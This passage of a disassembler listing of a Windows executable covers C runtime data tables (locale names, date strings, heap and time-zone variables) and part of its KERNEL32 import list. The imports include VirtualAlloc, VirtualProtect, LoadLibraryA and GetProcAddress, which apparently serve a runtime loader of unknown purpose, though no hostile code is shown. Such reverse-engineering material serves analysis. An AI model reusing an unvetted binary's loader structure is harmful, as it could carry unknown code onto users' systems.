		dd offset aNorwegianNynor ; "norwegian-nynorsk"
		dd 4E4F4Eh
		dd offset aPortugueseBraz ; "portuguese-brazilian"
		dd offset dword_424F9C+4B4h
		dd offset aSpanishArgenti ; "spanish-argentina"
		dd 535345h
		dd offset aSpanishBolivia ; "spanish-bolivia"
		dd offset dword_424F9C+3A9h
		dd offset aSpanishChile	; "spanish-chile"
		dd 4C5345h
		dd offset aSpanishColombi ; "spanish-colombia"
		dd 4F5345h
		dd offset aSpanishCostaRi ; "spanish-costa rica"
		dd offset dword_4333A0+1FA5h
		dd offset aSpanishDominic ; "spanish-dominican republic"
		dd 445345h
		dd offset aSpanishEcuador ; "spanish-ecuador"
		dd 465345h
		dd offset aSpanishElSalva ; "spanish-el	salvador"
		dd 455345h
		dd offset aSpanishGuatema ; "spanish-guatemala"
		dd 475345h
		dd offset aSpanishHondura ; "spanish-honduras"
		dd 485345h
		dd offset aSpanishMexican ; "spanish-mexican"
		dd 4D5345h
		dd offset aSpanishModern ; "spanish-modern"
		dd 4E5345h
		dd offset aSpanishNicarag ; "spanish-nicaragua"
		dd 495345h
		dd offset aSpanishPanama ; "spanish-panama"
		dd offset dword_414F9C+3A9h
		dd offset aSpanishParagua ; "spanish-paraguay"
		dd 5A5345h
		dd offset aSpanishPeru	; "spanish-peru"
		dd 525345h
		dd offset aSpanishPuertoR ; "spanish-puerto rico"
		dd 555345h
		dd offset aSpanishUruguay ; "spanish-uruguay"
		dd 595345h
		dd offset aSpanishVenezue ; "spanish-venezuela"
		dd 565345h
		dd offset aSwedishFinland ; "swedish-finland"
		dd 465653h
		dd offset aSwiss	; "swiss"
		dd 534544h
		dd offset aUk		; "uk"
		dd 474E45h
		dd offset aUs		; "us"
		dd 554E45h
		dd offset aUsa		; "usa"
		dd 554E45h
; void *off_43C828
off_43C828	dd offset off_43C830	; DATA XREF: ___init_time+44w
					; ___init_time+6Aw ...
		align 10h
off_43C830	dd offset aSun		; DATA XREF: ___init_time+6Ao
					; .data:off_43C828o
					; "Sun"
		dd offset aMon		; "Mon"
		dd offset aTue		; "Tue"
		dd offset aWed		; "Wed"
		dd offset aThu		; "Thu"
		dd offset aFri		; "Fri"
		dd offset aSat		; "Sat"
		dd offset aSunday	; "Sunday"
		dd offset aMonday	; "Monday"
		dd offset aTuesday	; "Tuesday"
		dd offset aWednesday	; "Wednesday"
		dd offset aThursday	; "Thursday"
		dd offset aFriday	; "Friday"
		dd offset aSaturday	; "Saturday"
		dd offset aJan		; "Jan"
		dd offset aFeb		; "Feb"
		dd offset aMar		; "Mar"
		dd offset aApr		; "Apr"
		dd offset aMay		; "May"
		dd offset aJun		; "Jun"
		dd offset aJul		; "Jul"
		dd offset aAug		; "Aug"
		dd offset aSep		; "Sep"
		dd offset aOct		; "Oct"
		dd offset aNov		; "Nov"
		dd offset aDec		; "Dec"
		dd offset aJanuary	; "January"
		dd offset aFebruary	; "February"
		dd offset aMarch	; "March"
		dd offset aApril	; "April"
		dd offset aMay		; "May"
		dd offset aJune		; "June"
		dd offset aJuly		; "July"
		dd offset aAugust	; "August"
		dd offset aSeptember	; "September"
		dd offset aOctober	; "October"
		dd offset aNovember	; "November"
		dd offset aDecember	; "December"
		dd offset aAm		; "AM"
		dd offset aPm		; "PM"
		dd offset aMDYy		; "M/d/yy"
		dd offset aDdddMmmmDdYyyy ; "dddd, MMMM	dd, yyyy"
		dd offset aHMmSs	; "H:mm:ss"
		align 10h
dword_43C8E0	dd 2Eh,	0		; DATA XREF: ___init_numeric+A4o
					; .data:off_43C8E8o
off_43C8E8	dd offset dword_43C8E0	; DATA XREF: ___init_monetary+8Dw
					; ___init_monetary+A4o	...
off_43C8EC	dd offset dword_43D7D8	; DATA XREF: ___init_monetary+96w
off_43C8F0	dd offset dword_43D7D8	; DATA XREF: ___init_monetary+9Fw
		dd offset dword_43D7D8
		dd offset dword_43D7D8
		dd offset dword_43D7D8
		dd offset dword_43D7D8
		dd offset dword_43D7D8
		dd offset dword_43D7D8
		dd offset dword_43D7D8
		dd 2 dup(7F7F7F7Fh)
off_43C918	dd offset off_43C8E8	; DATA XREF: ___init_numeric:loc_4087A7r
					; ___init_numeric+B1r ...
		align 10h
dword_43C920	dd 7080h		; DATA XREF: __tzset_lk+75w
					; __tzset_lk+89w ...
dword_43C924	dd 1			; DATA XREF: __tzset_lk+A2w
					; __tzset_lk:loc_40ABF7w ...
dword_43C928	dd 0FFFFF1F0h		; DATA XREF: __tzset_lk+ABw
					; __tzset_lk+B8w ...
dword_43C92C	dd 545350h, 0Fh	dup(0)	; DATA XREF: .data:lpMultiByteStro
dword_43C96C	dd 544450h, 0Fh	dup(0)	; DATA XREF: .data:off_43C9B0o
; LPSTR	lpMultiByteStr
lpMultiByteStr	dd offset dword_43C92C	; DATA XREF: __expandtime+334r
					; __tzset_lk+D0r ...
; LPSTR	off_43C9B0
off_43C9B0	dd offset dword_43C96C	; DATA XREF: __tzset_lk+109r
					; __tzset_lk+130r ...
		align 8
dword_43C9B8	dd 0FFFFFFFFh		; DATA XREF: __tzset_lk+1Dw
					; __isindst_0+1Er ...
dword_43C9BC	dd 0			; DATA XREF: __isindst_0:loc_40AF21r
					; _cvtdate+BFw
dword_43C9C0	dd 0			; DATA XREF: __isindst_0+192r
					; _cvtdate+E0w
		align 8
dword_43C9C8	dd 0FFFFFFFFh		; DATA XREF: __tzset_lk+16w
					; __isindst_0+26r ...
dword_43C9CC	dd 0			; DATA XREF: __isindst_0+13Ar
					; _cvtdate+EAw	...
dword_43C9D0	dd 0			; DATA XREF: __isindst_0+1A1r
					; _cvtdate+10Bw ...
		dd 2 dup(0)
dword_43C9DC	dd 0			; DATA XREF: _cvtdate+23r _cvtdate+A3r
dword_43C9E0	dd 0FFFFFFFFh		; DATA XREF: _cvtdate+84r
		dd 1Eh,	3Bh, 5Ah, 78h, 97h, 0B5h, 0D4h,	0F3h, 111h, 130h
		dd 14Eh
dword_43CA10	dd 16Dh			; DATA XREF: _cvtdate+2Er
					; _cvtdate:loc_40B045r
dword_43CA14	dd 0FFFFFFFFh		; DATA XREF: _cvtdate:loc_40B025r
		dd 1Eh,	3Ah, 59h, 77h, 96h, 0B4h, 0D3h,	0F2h, 110h, 12Fh
		dd 14Dh, 16Ch, 2BEh dup(0)
dword_43D540	dd 0			; DATA XREF: sub_401270+E3r
byte_43D544	db 0			; DATA XREF: sub_401D70:loc_401DA2r
		align 4
; char *dword_43D548
dword_43D548	dd 0			; DATA XREF: start+96w
					; __setenvp:loc_403703r ...
		align 10h
dword_43D550	dd 0			; DATA XREF: __amsg_exitr
					; _fast_error_exitr ...
		align 8
dword_43D558	dd 0			; DATA XREF: start+52w
dword_43D55C	dd 0			; DATA XREF: start+49w
dword_43D560	dd 0			; DATA XREF: start+3Ew
dword_43D564	dd 0			; DATA XREF: start+30w
dword_43D568	dd 0			; DATA XREF: __setargv+91w
dword_43D56C	dd 0			; DATA XREF: __setargv+89w
		dd 0
; LPVOID dword_43D574
dword_43D574	dd 0			; DATA XREF: __setenvp+44w _getenv+9r	...
dword_43D578	dd 0			; DATA XREF: ___crtsetenv+36r
dword_43D57C	dd 0			; DATA XREF: _getenv+16r
					; ___wtomb_environ+4r ...
		dd 0
dword_43D584	dd 0			; DATA XREF: __setargv+2Ew
		dd 0
byte_43D58C	db 0			; DATA XREF: _doexit+32w
		align 10h
dword_43D590	dd 0			; DATA XREF: _doexit+2Cw
dword_43D594	dd 0			; DATA XREF: _doexit+9r _doexit+97w
; CHAR Filename[260]
Filename	db 104h	dup(0)		; DATA XREF: __setargv:loc_4037C1o
dword_43D69C	dd 0			; DATA XREF: ___crtGetEnvironmentStringsA+2r
					; ___crtGetEnvironmentStringsA+23w ...
dword_43D6A0	dd 0			; DATA XREF: __FF_MSGBANNER+21r
dword_43D6A4	dd 0			; DATA XREF: _mallocr sub_4060A5+104r	...
dword_43D6A8	dd 0			; DATA XREF: _set_new_handler(int (*)(uint))+Cr
					; _set_new_handler(int (*)(uint))+14w ...
dword_43D6AC	dd 0			; DATA XREF: sub_40546B+4Bw
					; sub_405584+2Dw ...
dword_43D6B0	dd 6 dup(0)		; DATA XREF: .data:off_43BA14o
dword_43D6C8	dd 6 dup(0)		; DATA XREF: .data:lpCriticalSectiono
dword_43D6E0	dd 6 dup(0)		; DATA XREF: .data:off_43BA34o
dword_43D6F8	dd 6 dup(0)		; DATA XREF: .data:off_43BA44o
; LPTOP_LEVEL_EXCEPTION_FILTER lpfn
lpfn		dd 0			; DATA XREF: __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *):loc_405C42r
					; __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *)+38r ...
dword_43D714	dd 0			; DATA XREF: __setmbcp:loc_40648Ar
					; _getSystemCP+4w ...
dword_43D718	dd 0			; DATA XREF: ___crtMessageBoxA+3r
					; ___crtMessageBoxA+2Ew ...
dword_43D71C	dd 0			; DATA XREF: ___crtMessageBoxA+43w
					; ___crtMessageBoxA:loc_406FFEr
dword_43D720	dd 0			; DATA XREF: ___crtMessageBoxA+4Aw
					; ___crtMessageBoxA+60r
dword_43D724	dd 0			; DATA XREF: _signal:loc_4072FDr
					; _signal+16Bw	...
dword_43D728	dd 0			; DATA XREF: _signal:loc_4072E1r
					; _signal+14Fw	...
dword_43D72C	dd 0			; DATA XREF: _signal+112r _signal+118w ...
dword_43D730	dd 0			; DATA XREF: _signal:loc_4072EFr
					; _signal+15Dw	...
dword_43D734	dd 0			; DATA XREF: _signal:loc_40727Ar
					; _signal+FBw
dword_43D738	dd 2 dup(0)		; DATA XREF: __setlocale_set_cat+55o
					; __strcmpi+Co	...
; LCID dword_43D740
dword_43D740	dd 0			; DATA XREF: ___crtGetStringTypeA+7Br
					; _toupper+3r ...
dword_43D744	dd 0			; DATA XREF: ___init_monetaryr
dword_43D748	dd 0			; DATA XREF: ___init_numeric+3r
dword_43D74C	dd 0			; DATA XREF: ___init_timer
; UINT dword_43D750
dword_43D750	dd 0			; DATA XREF: _getSystemCP+3Ar
					; ___crtLCMapStringA+C0r ...
dword_43D754	dd 0			; DATA XREF: __setlocale_set_cat+CCw
dword_43D758	dd 0			; DATA XREF: ___crtLCMapStringA+28r
					; ___crtLCMapStringA+4Cw ...
dword_43D75C	dd 0			; DATA XREF: ___crtGetStringTypeA+26r
					; ___crtGetStringTypeA:loc_407806w
dword_43D760	dd 0			; DATA XREF: __expandlocale+94o
					; __expandlocale+DEo
word_43D764	dw 0			; DATA XREF: __expandlocale:loc_407FE6r
		align 4
dword_43D768	dd 0			; DATA XREF: __expandlocale+B1w
					; __expandlocale+F6o
; LPVOID dword_43D76C
dword_43D76C	dd 0			; DATA XREF: ___init_time:loc_4081D9r
					; ___init_time+4Fr ...
; LPVOID dword_43D770
dword_43D770	dd 0			; DATA XREF: ___init_numeric+19o
					; ___init_numeric+5Fr ...
; LPVOID dword_43D774
dword_43D774	dd 0			; DATA XREF: ___init_numeric+2Ao
					; ___init_numeric+6Ar ...
; LPVOID dword_43D778
dword_43D778	dd 0			; DATA XREF: ___init_numeric+3Ao
					; ___init_numeric+4Ar ...
; LPVOID dword_43D77C
dword_43D77C	dd 0			; DATA XREF: ___init_monetary+5Ar
					; ___init_monetary+6Br	...
; LPVOID dword_43D780
dword_43D780	dd 0			; DATA XREF: sub_408B88+1AEr
					; sub_408B88+1C1w ...
; LPVOID dword_43D784
dword_43D784	dd 0			; DATA XREF: sub_408B88+1C6r
					; sub_408B88+1D9w ...
dword_43D788	dd 3 dup(0)		; DATA XREF: __setlocale_set_cat+72o
word_43D794	dw 0			; DATA XREF: sub_408B88+25r
		align 4
		dd 0
word_43D79C	dw 0			; DATA XREF: __get_lc_lconv+6r
		align 10h
		db 2 dup(0)
word_43D7A2	dw 0			; DATA XREF: ___init_numeric+Br
		db 2 dup(0)
word_43D7A6	dw 0			; DATA XREF: __get_lc_time+5r
word_43D7A8	dw 0			; DATA XREF: __get_lc_time+Cr
		align 4
; LCID Locale
Locale		dd 0			; DATA XREF: ___get_qualified_locale+F4r
					; ___get_qualified_locale+10Cr	...
dword_43D7B0	dd 0			; DATA XREF: _GetLcidFromLangCountry+3Bw
					; LangCountryEnumProc(x)+1Ar ...
; size_t dword_43D7B4
dword_43D7B4	dd 0			; DATA XREF: _GetLcidFromLangCountry+42w
					; _GetLcidFromLangCountry+5Aw ...
dword_43D7B8	dd 0			; DATA XREF: _GetLcidFromLangCountry+19w
					; _GetLcidFromLangCountry+33r ...
; char *dword_43D7BC
dword_43D7BC	dd 0			; DATA XREF: ___get_qualified_locale+38w
					; ___get_qualified_locale+42o ...
; char *dword_43D7C0
dword_43D7C0	dd 0			; DATA XREF: ___get_qualified_locale+5Bw
					; ___get_qualified_locale+66o ...
dword_43D7C4	dd 0			; DATA XREF: ___get_qualified_locale+85w
					; ___get_qualified_locale:loc_408F07r ...
dword_43D7C8	dd 0			; DATA XREF: ___get_qualified_locale+116r
					; ___get_qualified_locale+150r	...
dword_43D7CC	dd 0			; DATA XREF: ___get_qualified_locale+3r
					; ___get_qualified_locale+1Bw ...
; WCHAR	LCData
LCData		dd 2 dup(0)		; DATA XREF: ___getlocaleinfo+CEo
dword_43D7D8	dd 0			; DATA XREF: __free_lc_lconv+Co
					; ___getlocaleinfo+129o ...
dword_43D7DC	dd 0			; DATA XREF: ___crtGetStringTypeW+26r
					; ___crtGetStringTypeW:loc_40A4E0w
dword_43D7E0	dd 0			; DATA XREF: __tzset_lk+24w
					; __tzset_lk+7Aw ...
		align 8
; struct _TIME_ZONE_INFORMATION	TimeZoneInformation
TimeZoneInformation _TIME_ZONE_INFORMATION <0> ; DATA XREF: __tzset_lk+47o
					; __tzset_lk+5Dr ...
; char *dword_43D894
dword_43D894	dd 0			; DATA XREF: __tzset_lk+147r
					; __tzset_lk:loc_40ACA6r ...
dword_43D898	dd 0			; DATA XREF: ___tzsetr	___tzset+10r ...
dword_43D89C	dd 0			; DATA XREF: ___crtGetLocaleInfoW+26r
					; ___crtGetLocaleInfoW+5Aw
dword_43D8A0	dd 0			; DATA XREF: ___crtGetLocaleInfoA+26r
					; ___crtGetLocaleInfoA+5Aw
dword_43D8A4	dd 0			; DATA XREF: ___crtCompareStringA+28r
					; ___crtCompareStringA+48w ...
dword_43D8A8	dd 0			; DATA XREF: sub_409A62:loc_409AF6w
					; sub_409A62+A1w ...
		dd 3 dup(0)
dword_43D8B8	dd 0			; DATA XREF: __expandtime+4Cw
					; __expandtime+77w ...
dword_43D8BC	dd 0			; DATA XREF: _toupper+2Cr
					; _setlocale+28w ...
		dd 3 dup(0)
; volatile LONG	Addend
Addend		dd 0			; DATA XREF: _toupper+1Fo
					; _setlocale:loc_407B51r ...
; UINT CodePage
CodePage	dd 0			; DATA XREF: __ismbbkanar
					; __setmbcp+1Br ...
		dd 1Fh dup(0)
dword_43D950	dd 3 dup(0)		; DATA XREF: __setmbcp+12Fo
					; __setmbcp+179o ...
dword_43D95C	dd 0			; DATA XREF: __setmbcp+114w
					; __setmbcp+168w ...
byte_43D960	db 0			; DATA XREF: _setSBUpLow:loc_406666w
					; _setSBUpLow:loc_406683w ...
		align 4
		dd 3Fh dup(0)
byte_43DA60	db 0			; DATA XREF: __setmbcp+6Eo
					; __setmbcp+BEo ...
byte_43DA61	db 0			; DATA XREF: _parse_cmdline+3Fr
					; _parse_cmdline+84r ...
		align 4
		dd 40h dup(0)
; LCID dword_43DB64
dword_43DB64	dd 0			; DATA XREF: __setmbcp+64w
					; __setmbcp+137w ...
dword_43DB68	dd 0			; DATA XREF: ___sbh_heap_init+3Cw
					; ___sbh_alloc_new_region+5r ...
		dd 4 dup(0)
dword_43DB7C	dd 0			; DATA XREF: sub_4043DB+23Ar
					; sub_4043DB+25Ar ...
dword_43DB80	dd 0			; DATA XREF: ___sbh_heap_init+31w
					; sub_4043DB+311w ...
		align 8
; void *dword_43DB88
dword_43DB88	dd 0			; DATA XREF: ___sbh_heap_init+21w
					; sub_4043DB+22Dr ...
dword_43DB8C	dd 0			; DATA XREF: .text:00403F1Ar
					; .text:00403F61r ...
; LPVOID lp
lp		dd 0			; DATA XREF: .text:00403F29r
					; .text:loc_403F69r ...
dword_43DB94	dd 0			; DATA XREF: sub_402725+30r
					; .text:004042A0r ...
; HANDLE hHeap
hHeap		dd 0			; DATA XREF: sub_402725+E1r
					; sub_402821+CEr ...
		dd 3 dup(0)
dword_43DBA8	dd 0			; DATA XREF: sub_402725+23r
					; sub_402821+2Er ...
		align 20h
dword_43DBC0	dd 0			; DATA XREF: __ioinit:loc_403B4Bw
					; __ioinit+4Br	...
dword_43DBC4	dd 3Fh dup(0)		; DATA XREF: __ioinit+98o
dword_43DCC0	dd 0Fh dup(0)		; DATA XREF: .text:00403D2Do
; UINT uNumber
uNumber		dd 0			; DATA XREF: __ioinit+28w
					; __ioinit:loc_403BB9r	...
dword_43DD00	dd 0			; DATA XREF: __setenvp+ADw _getenvr
		align 10h
dword_43DD10	dd 0			; DATA XREF: __wincmdlnr __setenvp+3r	...
dword_43DD14	dd 0			; DATA XREF: _doexit+43r
dword_43DD18	dd 0			; DATA XREF: _doexit+3Ar _doexit+5Cr
dword_43DD1C	dd 0			; DATA XREF: __cinitr
dword_43DD20	dd 0			; DATA XREF: start+8Cw	__wincmdln+Fr ...
		align 400h
_data		ends

;
; Imports from KERNEL32.dll
;
; Section 4. (virtual address 0003E000)
; Virtual size			: 00000A42 (   2626.)
; Section size in file		: 00001000 (   4096.)
; Offset to raw	data for section: 0003E000
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Externs
; _idata
; void __stdcall Sleep(DWORD dwMilliseconds)
		extrn Sleep:dword	; CODE XREF: sub_401270+70p
					; sub_401270+FAp ...
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn LoadLibraryA:dword ; CODE	XREF: _WinMain@16_0+3FEp
					; _WinMain@16_0+405p ...
; BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
		extrn VirtualFree:dword	; CODE XREF: sub_4019A0+1Ep
					; sub_4019E0+9Ep ...
; BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
		extrn VirtualProtect:dword ; CODE XREF:	sub_4019E0+B6p
					; DATA XREF: sub_4019E0+B6r ...
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
		extrn VirtualAlloc:dword ; CODE	XREF: sub_4019E0+50p
					; ___sbh_alloc_new_region+76p ...
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
		extrn GetProcAddress:dword ; CODE XREF:	sub_401D70+B7p
					; ___crtMessageBoxA+2Ap ...
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; CODE XREF: sub_401D70+88p
					; start+D4p ...
; int __stdcall	CompareStringW(LCID Locale, DWORD dwCmpFlags, PCNZWCH lpString1, int cchCount1,	PCNZWCH	lpString2, int cchCount2)
		extrn CompareStringW:dword ; CODE XREF:	___crtCompareStringA+3Ep
					; ___crtCompareStringA+261p
					; DATA XREF: ...
; int __stdcall	CompareStringA(LCID Locale, DWORD dwCmpFlags, PCNZCH lpString1,	int cchCount1, PCNZCH lpString2, int cchCount2)
		extrn CompareStringA:dword ; CODE XREF:	___crtCompareStringA+5Bp
					; ___crtCompareStringA+B9p
					; DATA XREF: ...
; void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD	ExceptionRecord, PVOID ReturnValue)
		extrn __imp_RtlUnwind:dword ; DATA XREF: RtlUnwindr
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA	lpStartupInfo)
		extrn GetStartupInfoA:dword ; CODE XREF: start+B1p
					; __ioinit+5Ep
					; DATA XREF: ...
; LPSTR	__stdcall GetCommandLineA()
		extrn GetCommandLineA:dword ; CODE XREF: start+86p
					; DATA XREF: start+86r	...
; DWORD	__stdcall GetVersion()
		extrn GetVersion:dword	; CODE XREF: start+26p
					; DATA XREF: start+26r	...
; void __stdcall ExitProcess(UINT uExitCode)
		extrn ExitProcess:dword	; CODE XREF: _fast_error_exit+1Dp
					; _doexit+9Dp ...
; LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)
		extrn HeapAlloc:dword	; CODE XREF: sub_402725+E7p
					; ___sbh_heap_init+Dp ...
; BOOL __stdcall HeapFree(HANDLE hHeap,	DWORD dwFlags, LPVOID lpMem)
		extrn HeapFree:dword	; CODE XREF: sub_402821+D4p
					; .text:00403F5Bp ...
; DWORD	__stdcall GetCurrentThreadId()
		extrn GetCurrentThreadId:dword ; CODE XREF: __mtinit+3Fp
					; __getptd+45p
					; DATA XREF: ...
; BOOL __stdcall TlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue)
		extrn TlsSetValue:dword	; CODE XREF: __mtinit+2Ep __getptd+34p ...
; DWORD	__stdcall TlsAlloc()
		extrn TlsAlloc:dword	; CODE XREF: __mtinit+6p
					; DATA XREF: __mtinit+6r ...
; BOOL __stdcall TlsFree(DWORD dwTlsIndex)
		extrn TlsFree:dword	; CODE XREF: .text:004031E0p
					; DATA XREF: .text:004031E0r ...
; void __stdcall SetLastError(DWORD dwErrCode)
		extrn SetLastError:dword ; CODE	XREF: __getptd+5Cp
					; DATA XREF: __getptd+5Cr ...
; LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex)
		extrn TlsGetValue:dword	; CODE XREF: __getptd+10p
					; .text:00403280p
					; DATA XREF: ...
; DWORD	__stdcall GetLastError()
		extrn GetLastError:dword ; CODE	XREF: __getptd+2p
					; _signal:loc_4072B8p ...
; HANDLE __stdcall GetCurrentThread()
		extrn GetCurrentThread:dword ; DATA XREF: .text:0040330Er
					; .text:0040BFF2r
; BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT	uExitCode)
		extrn TerminateProcess:dword ; CODE XREF: _doexit+1Cp
					; DATA XREF: _doexit+1Cr ...
; HANDLE __stdcall GetCurrentProcess()
		extrn GetCurrentProcess:dword ;	CODE XREF: _doexit+15p
					; DATA XREF: _doexit+15r ...
; LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
		extrn UnhandledExceptionFilter:dword ; CODE XREF: __XcptFilter+134p
					; DATA XREF: __XcptFilter+134r	...
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename,	DWORD nSize)
		extrn GetModuleFileNameA:dword ; CODE XREF: __setargv+23p
					; sub_403D66+B4p ...
; BOOL __stdcall FreeEnvironmentStringsA(LPCH)
		extrn FreeEnvironmentStringsA:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+11Fp
					; DATA XREF: ___crtGetEnvironmentStringsA+11Fr	...
; BOOL __stdcall FreeEnvironmentStringsW(LPWCH)
		extrn FreeEnvironmentStringsW:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+CEp
					; DATA XREF: ___crtGetEnvironmentStringsA+CEr ...
; int __stdcall	WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR	lpMultiByteStr,	int cbMultiByte, LPCSTR	lpDefaultChar, LPBOOL lpUsedDefaultChar)
		extrn WideCharToMultiByte:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+93p
					; ___crtGetEnvironmentStringsA+B5p ...
; LPCH __stdcall GetEnvironmentStrings()
		extrn GetEnvironmentStrings:dword
					; CODE XREF: ___crtGetEnvironmentStringsA:loc_403A26p
					; ___crtGetEnvironmentStringsA+E1p
					; DATA XREF: ...
; LPWCH	__stdcall GetEnvironmentStringsW()
		extrn GetEnvironmentStringsW:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+1Bp
					; ___crtGetEnvironmentStringsA+5Bp
					; DATA XREF: ...
; UINT __stdcall SetHandleCount(UINT uNumber)
		extrn SetHandleCount:dword ; CODE XREF:	__ioinit+1B1p
					; DATA XREF: __ioinit+1B1r ...
; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
		extrn GetStdHandle:dword ; CODE	XREF: __ioinit+16Cp
					; sub_4040CD+143p
					; DATA XREF: ...
; DWORD	__stdcall GetFileType(HANDLE hFile)
		extrn GetFileType:dword	; CODE XREF: __ioinit+109p
					; __ioinit+17Ap
					; DATA XREF: ...
; void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn DeleteCriticalSection:dword ; CODE XREF: .text:00403D08p
					; __mtdeletelocks+34p ...
; DWORD	__stdcall GetEnvironmentVariableA(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize)
		extrn GetEnvironmentVariableA:dword ; CODE XREF: sub_403D66+54p
					; DATA XREF: sub_403D66+54r ...
; BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA	lpVersionInformation)
		extrn GetVersionExA:dword ; CODE XREF: sub_403D66+1Fp
					; _IsThisWindowsNT+1Ap
					; DATA XREF: ...
; BOOL __stdcall HeapDestroy(HANDLE hHeap)
		extrn HeapDestroy:dword	; CODE XREF: sub_403EAE+50p
					; .text:00403FAAp
					; DATA XREF: ...
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
		extrn HeapCreate:dword	; CODE XREF: sub_403EAE+11p
					; DATA XREF: sub_403EAE+11r ...
; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,	LPDWORD	lpNumberOfBytesWritten,	LPOVERLAPPED lpOverlapped)
		extrn WriteFile:dword	; CODE XREF: sub_4040CD+14Ap
					; DATA XREF: sub_4040CD+14Ar ...
; LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes)
		extrn HeapReAlloc:dword	; CODE XREF: ___sbh_alloc_new_region+28p
					; sub_40BBAD+14Fp ...
; BOOL __stdcall IsBadWritePtr(LPVOID lp, UINT_PTR ucb)
		extrn IsBadWritePtr:dword ; CODE XREF: ___sbh_heap_check+1Ep
					; ___sbh_heap_check+57p ...
; void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn InitializeCriticalSection:dword ;	CODE XREF: __mtinitlocks+Dp
					; __mtinitlocks+15p ...
; void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn EnterCriticalSection:dword ; CODE	XREF: __lock+58p
					; DATA XREF: __lock+58r ...
; void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn LeaveCriticalSection:dword ; CODE	XREF: __unlock+Dp
					; DATA XREF: __unlock+Dr ...
; void __stdcall FatalAppExitA(UINT uAction, LPCSTR lpMessageText)
		extrn FatalAppExitA:dword ; CODE XREF: .text:00405C0Dp
					; DATA XREF: .text:00405C0Dr ...
; LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
		extrn SetUnhandledExceptionFilter:dword	; CODE XREF: sub_405C65+5p
					; sub_405C76+6p
					; DATA XREF: ...
; BOOL __stdcall IsBadReadPtr(const void *lp, UINT_PTR ucb)
		extrn IsBadReadPtr:dword ; CODE	XREF: _ValidateRead(void const *,uint)+Cp
					; DATA XREF: _ValidateRead(void	const *,uint)+Cr ...
; BOOL __stdcall IsBadCodePtr(FARPROC lpfn)
		extrn IsBadCodePtr:dword ; CODE	XREF: _ValidateExecute(int (*)(void))+8p
					; DATA XREF: _ValidateExecute(int (*)(void))+8r ...
; BOOL __stdcall GetCPInfo(UINT	CodePage, LPCPINFO lpCPInfo)
		extrn GetCPInfo:dword	; CODE XREF: __setmbcp+51p
					; _setSBUpLow+14p ...
; UINT __stdcall GetACP()
		extrn GetACP:dword	; DATA XREF: _getSystemCP+2Fr
					; .text:0040C0A0r
; UINT __stdcall GetOEMCP()
		extrn GetOEMCP:dword	; DATA XREF: _getSystemCP+1Ar
					; .text:0040C0A6r
; BOOL __stdcall SetConsoleCtrlHandler(PHANDLER_ROUTINE	HandlerRoutine,	BOOL Add)
		extrn SetConsoleCtrlHandler:dword ; CODE XREF: _signal+F1p
					; DATA XREF: _signal+F1r ...
; int __stdcall	MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr,	int cchWideChar)
		extrn MultiByteToWideChar:dword	; CODE XREF: ___crtLCMapStringA+DFp
					; ___crtLCMapStringA+137p ...
; int __stdcall	LCMapStringA(LCID Locale, DWORD	dwMapFlags, LPCSTR lpSrcStr, int cchSrc, LPSTR lpDestStr, int cchDest)
		extrn LCMapStringA:dword ; CODE	XREF: ___crtLCMapStringA+5Ep
					; ___crtLCMapStringA+A7p
					; DATA XREF: ...
; int __stdcall	LCMapStringW(LCID Locale, DWORD	dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int	cchDest)
		extrn LCMapStringW:dword ; CODE	XREF: ___crtLCMapStringA+42p
					; ___crtLCMapStringA+14Dp ...
; BOOL __stdcall GetStringTypeA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr,	int cchSrc, LPWORD lpCharType)
		extrn GetStringTypeA:dword ; CODE XREF:	___crtGetStringTypeA+59p
					; ___crtGetStringTypeA+8Dp ...
; BOOL __stdcall GetStringTypeW(DWORD dwInfoType, LPCWSTR lpSrcStr, int	cchSrc,	LPWORD lpCharType)
